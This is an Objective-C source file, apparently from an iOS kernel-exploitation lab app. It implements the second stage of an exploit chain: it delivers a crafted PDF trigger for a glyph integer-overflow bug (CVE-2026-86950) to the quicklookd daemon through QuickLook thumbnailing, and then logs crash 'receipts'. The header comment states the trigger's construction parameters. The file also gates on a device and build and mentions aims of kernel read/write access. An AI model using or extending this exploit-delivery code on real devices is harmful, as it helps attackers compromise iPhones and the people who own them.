//
//  P131QuickLookDetour.m — the QuickLook detour (stage 2 of the calif
//  chain). p131. Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Provenance: the calif.io demo decode (the messages PDF -> preview ->
//  glitchy notification -> status-bar text = SpringBoard-level artifact)
//  + CVE-2026-86950 (the glyph OOB, live on 23F77, our p076 v2 harness
//  SIGBUS'd it in-process). The decode: the demo's preview step is a
//  DELIVERY mechanism — thumbnails/previews hand the content to
//  quicklookd, so the crafted parse lands in a DAEMON, not our process.
//  p131 tests exactly that handoff with the content we already own
//  (the bundled califio trigger PDF: leaf glyph + 2-pt line at x=32000,
//  9-level composite chain, Tf=1024, upm=16384 -> the int32 overflow).
//
//  Honest detection model: in-process we observe (a) the CGPDFDocument
//  parse result, (b) the QLThumbnailGenerator callback (error = what our
//  app saw), (c) whether we survive. A quicklookd CRASH is the real
//  daemon receipt and lives in the crash logs the user pulls after.
//  No SpringBoard claims. One tap per force-quit. PANIC-POSSIBLE.
//

#import "P131QuickLookDetour.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"
#import "LabBandit.h"

#import <CoreGraphics/CoreGraphics.h>
#import <QuickLookThumbnailing/QuickLookThumbnailing.h>
#import <ImageIO/ImageIO.h>
#import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>
#import <mach/mach.h>

#define P131_BUILD @"p131-ql-detour-v1"

static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static NSString *P131R(void);

/* minimal benign Helvetica PDF written to Documents (p076's control law) */
static NSURL *p131_write_benign(NSString *dir) {
    NSURL *url = [NSURL fileURLWithPath:[dir stringByAppendingPathComponent:
                                         @"p131_benign.pdf"]];
    CGContextRef pdf = CGPDFContextCreateWithURL((__bridge CFURLRef)url, NULL, NULL);
    if (!pdf) return NULL;
    CGContextBeginPage(pdf, NULL);
    CGContextSelectFont(pdf, "Helvetica", 12, kCGEncodingMacRoman);
    CGContextShowTextAtPoint(pdf, 20, 700, "benign control", 14);
    CGContextEndPage(pdf);
    CGPDFContextClose(pdf);
    CFRelease(pdf);
    return url;
}

static void p131_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p131", arms, 1, &sr, 0, "p131 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p131", 0, outcome);
}

/* one QLThumbnailGenerator request with a bounded wait; returns the
   callback state as text (the only in-process observations possible) */
static NSString *p131_ql_thumb(NSURL *url, NSMutableString *out) {
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block NSString *verdict = @"(semaphore timeout 15s)";
    QLThumbnailGenerationRequest *qreq =
        [[QLThumbnailGenerationRequest alloc] initWithFileAtURL:url
                                                           size:CGSizeMake(512, 512)
                                                          scale:3.0
                                              representationTypes:
         QLThumbnailGenerationRequestRepresentationTypeLowQualityThumbnail];
    [[QLThumbnailGenerator sharedGenerator]
        generateBestRepresentationForRequest:qreq
                           completionHandler:^(QLThumbnailRepresentation *rep,
                                               NSError *err) {
        if (err) {
            verdict = [NSString stringWithFormat:@"ERROR domain=%@ code=%ld %@",
                       err.domain, (long)err.code, err.localizedDescription];
        } else if (rep) {
            verdict = [NSString stringWithFormat:@"OK %dx%d (type=%ld) — content "
                       @"parsed (which process did it is the crash-log question)",
                       (int)CGImageGetWidth(rep.CGImage),
                       (int)CGImageGetHeight(rep.CGImage),
                       (long)rep.type];
        } else {
            verdict = @"OK (no error, no representation)";
        }
        dispatch_semaphore_signal(sem);
    }];
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
    return verdict;
}

@implementation P131QuickLookDetour

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p131_qldetour_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p131 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P131_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] stage 2 of the calif chain: the preview step = quicklookd");
    L(@"  delivery. The 86950 trigger content parses WHERE THE RENDERER");
    L(@"  RUNS — the daemon receipt (quicklookd crash) lands in the crash");
    L(@"  logs, not in this log. No SpringBoard claims from this tap.");
    L(@"[!] PANIC-POSSIBLE — one tap per force-quit.");
    L(@"[law] hasKread stays NO; daemon-level crash receipts are FINDING");
    L(@"  class, and conversion stays the p130/p073 bar.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p131"];
    if (stop) { L(stop); p131_bandit("gated"); return P131R(); }

    NSURL *trigger = [[NSBundle mainBundle] URLForResource:@"p076_trigger"
                                             withExtension:@"pdf"];
    NSData *trig = [NSData dataWithContentsOfURL:trigger];
    Lf(@"[assets] p076_trigger.pdf present=%@ len=%lu",
       trigger ? @"YES" : @"NO", (unsigned long)trig.length);
    if (!trig.length) { L(@"[-] honest stop (trigger asset missing)");
                        p131_bandit("noasset"); return P131R(); }

    /* ---- stage 1: CONTROL — benign through the same route ---- */
    L(@"=== STAGE 1 CONTROL (benign PDF, in-process parse + QL thumb) ===");
    NSURL *benign = p131_write_benign(docs);
    CGPDFDocumentRef bdoc = CGPDFDocumentCreateWithURL((__bridge CFURLRef)benign);
    Lf(@"  in-process CGPDFDocument: %@",
       bdoc && CGPDFDocumentGetNumberOfPages(bdoc) >= 1 ? @"parsed OK" : @"PARSE FAIL");
    if (bdoc) CFRelease(bdoc);
    Lf(@"  QL thumbnail: %@", p131_ql_thumb(benign, g_buf));

    /* ---- stage 2: TRIGGER via the QL detour (daemon handoff) ---- */
    L(@"=== STAGE 2 TRIGGER-QL (quicklookd delivery of the trigger) ===");
    L(@"[IN FLIGHT] quicklookd now owns our crafted content - one tap per force-quit.");
    Lf(@"  QL thumbnail(trigger): %@", p131_ql_thumb(trigger, g_buf));
    L(@"  [if we crashed before this line: the parse stayed in-process and");
    L(@"   KILLED US (86950 live) - the recovery packet is the stage-3 proof");
    L(@"   path p076 already collects. If we survived AND a quicklookd panic");
    L(@"   appears in crash logs within minutes = THE DAEMON RECEIPT.]");

    /* ---- stage 3: our-process control so the difference is attributable */
    L(@"=== STAGE 3 ImageIO in-process control (p076 replica, bounded) ===");
    CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)trigger, NULL);
    if (src) {
        CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, NULL);
        Lf(@"  ImageIO thumbnail: %@", img ? @"rendered OK in-process (did NOT "
           @"hit the overflow this boot)" : @"FAILED/aborted in-process");
        if (img) CFRelease(img);
        CFRelease(src);
    } else {
        L(@"  ImageIO source: FAILED to open");
    }

    L(@"=== VERDICT (honest) ===");
    L(@"  receipts available after this tap:");
    L(@"   1. quicklookd crash log w/ glyph path = DAEMON-LEVEL DRIVE of");
    L(@"      86950 from a sandboxed app = the stage-2 evidence the calif");
    L(@"      chain used. Not KRW; hasKread stays NO.");
    L(@"   2. our-process SIGBUS on stage 3 = the p076 in-process receipt");
    L(@"      (already attested; repeat here = consistency).");
    L(@"   3. clean everything = the QL handoff sanitized the content");
    L(@"      (also a law: which layer blocks the trigger).");
    p131_bandit("ran");
    Lf(@"=== p131 end %@ ===", LabLocalMilitaryNow());
    return P131R();
}

static NSString *P131R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end